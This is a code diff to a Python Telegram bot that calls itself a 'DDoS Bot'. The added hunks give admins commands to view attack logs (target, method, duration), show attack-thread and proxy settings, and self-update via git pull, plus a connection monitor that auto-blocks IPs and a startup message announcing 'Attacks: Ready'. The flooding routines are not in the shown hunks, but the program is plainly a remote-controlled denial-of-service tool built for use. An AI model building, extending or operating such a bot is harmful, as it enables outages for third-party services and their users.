@@ -1,3 +1,20 @@
+import os
+import sys
+import time
+import json
+import random
+import socket
+import threading
+import subprocess
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
+import struct
+import ssl
+import requests
+from urllib.parse import urlparse
+import ipaddress
+
+# ================== AUTO INSTALL MODULES ==================
 def install_requirements():
     """Auto-install required Python packages"""
     print("\n" + "="*60)
@@ -27,6 +44,17 @@ def install_requirements():
                 print(f"❌ Failed to install {module}")
     
     print("="*60 + "\n")
+
+# Install dependencies
+install_requirements()
+
+# Now import all modules
+import telebot
+import psutil
+import dns.resolver
+from colorama import init, Fore, Style, Back
+import pyfiglet
+from tqdm import tqdm
 
 # Initialize colorama
 init(autoreset=True)
@@ -661,18 +689,201 @@ def handle_stop(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
-@bot.message_handler(commands)
+@bot.message_handler(commands=['logs'])
+def handle_logs(message):
+    """Show attack logs"""
+    if not is_admin(message.from_user.id):
+        return
     
-    from flask import Flask
-import threading
+    try:
+        parts = message.text.split()
+        limit = 5
+        if len(parts) >= 2:
+            limit = min(int(parts[1]), 20)
+        
+        if not attack_logs:
+            bot.reply_to(message, "📝 No logs available")
+            return
+        
+        logs_text = f"""
+📝 *RECENT ATTACK LOGS ({limit})*
 
-app = Flask(__name__)
+"""
+        for log in attack_logs[-limit:]:
+            logs_text += f"""
+⏰ *Time:* `{log.get('timestamp', 'N/A')}`
+🎯 *Target:* `{log.get('target', 'N/A')}`
+⚡ *Method:* `{log.get('method', 'N/A')}`
+⏱️ *Duration:* `{log.get('duration', 'N/A')}s`
+{'─'*20}
+"""
+        
+        bot.reply_to(message, logs_text, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
-@app.route("/")
-def home():
-    return "Bot is running ✅"
+@bot.message_handler(commands=['block'])
+def handle_block(message):
+    """Block an IP"""
+    if not is_admin(message.from_user.id):
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ Usage: `/block 192.168.1.1`", parse_mode='Markdown')
+            return
+        
+        ip = parts[1]
+        if monitor.block_ip(ip):
+            bot.reply_to(message, f"✅ IP `{ip}` blocked", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"❌ Failed to block `{ip}`", parse_mode='Markdown')
+            
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
-def run_server():
-    app.run(host="0.0.0.0", port=3000)
+@bot.message_handler(commands=['config'])
+def handle_config(message):
+    """Show configuration"""
+    if not is_admin(message.from_user.id):
+        return
+    
+    config_text = f"""
+⚙️ *BOT CONFIGURATION*
 
-threading.Thread(target=run_server).start()
+🤖 *Bot Settings:*
+• Admin ID: `{config['ADMIN_ID']}`
+• Max Duration: `{config['MAX_DURATION']}s`
+• Attack Threads: `{config['ATTACK_THREADS']}`
+
+🛡️ *Protection Settings:*
+• Check Interval: `{config['CHECK_INTERVAL']}s`
+• Max Connections: `{config['MAX_CONNECTIONS']}`
+• Monitored Ports: `{config['PORTS']}`
+
+📁 *Files:*
+• Config: `{CONFIG_FILE}`
+• Logs: `{config['LOGS_FILE']}`
+• Proxies: `{config['PROXY_FILE']}`
+
+⚠️ *Edit config file to change settings*
+"""
+    bot.reply_to(message, config_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['update'])
+def handle_update(message):
+    """Update the bot"""
+    if not is_admin(message.from_user.id):
+        return
+    
+    bot.reply_to(message, "🔄 Updating bot...")
+    try:
+        # Self-update mechanism
+        subprocess.run(["git", "pull"], check=True)
+        install_requirements()
+        bot.reply_to(message, "✅ Bot updated successfully! Restart required.")
+    except:
+        bot.reply_to(message, "⚠️ Manual update required. Check GitHub repo.")
+
+# ================== BACKGROUND MONITORING ==================
+def background_monitor():
+    """Background monitoring for DDoS detection"""
+    while True:
+        try:
+            connections = monitor.get_connections()
+            if len(connections) > config['MAX_CONNECTIONS']:
+                # Potential DDoS detected
+                counter = {}
+                for ip in connections:
+                    counter[ip] = counter.get(ip, 0) + 1
+                
+                # Find top attackers
+                top_ips = sorted(counter.items(), key=lambda x: x[1], reverse=True)[:3]
+                
+                # Send alert
+                alert_msg = f"""
+🚨 *DDoS DETECTED!*
+
+📊 Connections: `{len(connections)}`
+⚠️ Threshold: `{config['MAX_CONNECTIONS']}`
+
+🔍 *Top IPs:*
+"""
+                for ip, count in top_ips:
+                    alert_msg += f"• `{ip}` → {count} connections\n"
+                
+                # Auto-block top IPs
+                blocked_count = 0
+                for ip, count in top_ips:
+                    if count > (config['MAX_CONNECTIONS'] // 5):
+                        if monitor.block_ip(ip):
+                            blocked_count += 1
+                
+                alert_msg += f"\n🛡️ Auto-blocked: `{blocked_count}` IPs"
+                
+                # Send to all admins
+                for admin_id in admin_list:
+                    try:
+                        bot.send_message(admin_id, alert_msg, parse_mode='Markdown')
+                    except:
+                        pass
+            
+            time.sleep(config['CHECK_INTERVAL'])
+            
+        except Exception as e:
+            time.sleep(10)
+
+# ================== MAIN FUNCTION ==================
+def main():
+    """Main function"""
+    show_banner()
+    
+    print(Fore.GREEN + "[*] Starting DDoS Bot...")
+    print(Fore.YELLOW + "[*] Initializing systems...")
+    
+    # Start background monitoring
+    monitor_thread = threading.Thread(target=background_monitor, daemon=True)
+    monitor_thread.start()
+    
+    print(Fore.GREEN + "[+] Background monitoring started")
+    print(Fore.CYAN + "[*] Bot is ready!")
+    print(Fore.MAGENTA + f"[*] Admin ID: {config['ADMIN_ID']}")
+    print(Fore.YELLOW + "═" * 60)
+    print(Fore.GREEN + "✅ Bot is running! Use /help in Telegram")
+    print(Fore.YELLOW + "═" * 60 + "\n")
+    
+    # Send startup message
+    try:
+        startup_msg = f"""
+🚀 *DDoS Bot Started Successfully!*
+
+⏰ Time: `{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}`
+💻 Host: `{socket.gethostname()}`
+📊 System: Ready
+🛡️ Protection: Active
+⚡ Attacks: Ready
+
+Use `/help` for commands list
+"""
+        bot.send_message(config['ADMIN_ID'], startup_msg, parse_mode='Markdown')
+    except:
+        print(Fore.RED + "[!] Failed to send startup message")
+        print(Fore.YELLOW + "[!] Check your bot token and admin ID")
+    
+    # Start bot polling
+    try:
+        bot.polling(none_stop=True, timeout=30)
+    except Exception as e:
+        print(Fore.RED + f"[!] Bot error: {e}")
+        print(Fore.YELLOW + "[*] Restarting in 5 seconds...")
+        time.sleep(5)
+        main()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[!] Bot stopped by user")
+        sys.exit(0)
